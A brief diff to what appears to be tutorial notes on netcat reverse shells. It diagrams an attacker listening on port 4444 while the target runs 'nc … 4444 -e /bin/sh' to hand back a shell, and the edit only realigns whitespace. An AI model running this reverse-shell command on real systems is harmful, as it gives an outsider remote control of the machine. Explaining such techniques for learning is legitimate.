@@ -9,7 +9,7 @@ Issue commands on the target host from the attack box.
 
 Attacker machine |                                           |   Target Machine
 192.168.2.1      |   <<---------tcp connection----------     |   192.168.55.30
-nc -vlp 4444    |                                           |   nc 192.168.2.1(Attaker IP) 4444 -e /bin/sh
+nc -vlp 4444     |                                           |   nc 192.168.2.1(Attaker IP) 4444 -e /bin/sh
 listining port   |                                           |   connecting port
 
 
